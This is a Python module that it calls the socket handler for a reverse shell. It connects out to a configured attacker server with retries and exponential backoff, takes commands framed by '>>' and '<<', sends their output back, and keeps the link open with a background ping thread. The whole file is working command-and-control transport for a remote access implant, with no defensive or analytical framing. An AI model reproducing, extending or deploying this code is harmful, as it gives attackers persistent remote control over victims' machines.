"""
This module contains the socket handler for the reverse shell.
"""

# 1st party imports
import time
import socket
import threading
from typing import Optional

# local imports
from config import SERVER_URL, SERVER_PORT, PING_INTERVAL, PING_MESSAGE


class SocketHandler:
    """
    The socket handler for the reverse shell.
    """

    def __init__(self):

        # create a socket instance
        self.socket = socket.socket()

        # flag to check if the socket is connected
        self.__connected: bool = False

        # connect to the server
        self.connect_to_server()

        # start a background ping thread to keep the connection alive
        self._stop_ping = threading.Event()
        self._ping_thread = threading.Thread(
            target=self._ping_loop,
            daemon=True,
        )
        self._ping_thread.start()

    @property
    def is_connected(self) -> bool:
        """
        The connection status of the socket.
        """
        return self.__connected

    def connect_to_server(self, retries: int = 5):
        """
        This function connects to the server with delay.
        It attempts to make a connection 5 times with exponential backoff.
        """

        # wait time after errors
        wait_time = 20

        # run infinite loop until connected
        while retries > 0:
            try:

                self.socket.connect((SERVER_URL, SERVER_PORT))
                self.__connected = True
                break
            except:
                time.sleep(wait_time)
                wait_time *= 2
                retries -= 1

    def receive_command(self, buffer_size: int = 4096) -> Optional[str]:
        """
        This function receives a command from the server.

        Args:
            buffer_size (int, optional): The size of the buffer to receive the command. Defaults to 2048.

        Returns:
            Optional[str]: If connected, returns the received command. Otherwise, returns None.
        """

        # check if connected
        if not self.is_connected:
            return None

        try:

            # get the command
            encoded_command = self.socket.recv(buffer_size)
            decoded_command = encoded_command.decode().strip()

            # check if command has prefix and suffix
            if not decoded_command.startswith(">>") or not decoded_command.endswith(
                "<<"
            ):

                # send a response to the server
                self.send_output(
                    "Invalid command format. Command must start with '>>' and end with '<<'."
                )
                return None

            # remove prefix and suffix
            decoded_command = decoded_command.removeprefix(">>").removesuffix("<<")

            # if the command is empty, return None
            return decoded_command if decoded_command else None
        except (socket.error, socket.timeout):
            self.__connected = False
            return None
        except Exception:
            return None

    def send_output(self, output: str | bytes):
        """
        This function sends the output to the server.

        Args:
            output (str | bytes): The output to send to the server.
        """

        # check if the output is bytes, decode it
        if isinstance(output, bytes):
            output = output.decode()

        try:
            if isinstance(output, str):

                # prepare the output
                output = f"Output:\n{output.strip()}\n"

                # send the output
                self.socket.sendall(output.encode())
        except Exception:
            pass

    def _ping_loop(self):
        """Send a small ping to the server at regular intervals
        to prevent stale TCP connections. Runs in a daemon thread and
        does **not** block main execution.
        """

        while not self._stop_ping.is_set():
            time.sleep(PING_INTERVAL)

            # only ping if still connected
            if self.is_connected:
                try:
                    self.socket.sendall(PING_MESSAGE)
                except Exception:
                    pass

    def close(self):
        """
        This function closes the socket.
        """

        try:
            # stop ping thread
            if hasattr(self, "_stop_ping"):
                self._stop_ping.set()
            self.__connected = False
            self.socket.close()
        except Exception:
            pass
